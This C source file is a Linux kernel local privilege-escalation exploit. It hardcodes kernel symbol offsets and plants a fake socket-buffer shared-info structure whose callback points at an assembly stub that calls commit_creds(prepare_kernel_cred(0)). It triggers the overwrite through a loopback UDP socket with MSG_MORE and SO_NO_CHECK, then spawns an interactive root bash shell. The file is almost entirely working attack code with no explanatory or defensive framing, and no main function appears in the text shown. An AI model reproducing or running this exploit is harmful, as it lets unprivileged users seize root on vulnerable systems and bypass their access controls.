#include <sys/mman.h>
#include <sys/utsname.h>
#include <linux/socket.h>
#include <netinet/ip.h>
#include <sys/klog.h>

#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define SHINFO_OFFSET 3164
#define LSB_RELEASE_LENGTH 1024
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define PROC_CPUINFO_LENGTH 4096
#define COMMIT_CREDS			(KERNEL_BASE + commit_creds_val)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + prepare_kernel_cred_val)

uint64_t saved_esp;

unsigned long KERNEL_BASE =		0xffffffff81000000ul;

uint64_t commit_creds_val = 0xa5d20;
uint64_t prepare_kernel_cred_val = 0xa6110;

#define COMMIT_CREDS			(KERNEL_BASE + commit_creds_val)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + prepare_kernel_cred_val)

typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

void get_root(void) {
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
}

void wrapper() {
	asm volatile (" 					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call get_root				\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}

void payload();



struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};

struct skb_shared_info {
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint16_t gso_type;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}


void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);

	int s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}

	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	int rv = send(s, buffer, size, MSG_MORE);
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}

	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}

	send(s, buffer, 1, 0);

	close(s);
}

void root_access_grant() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void root_access_validity(unsigned long payload) {
	oob_execute(payload);
	root_access_grant();
}


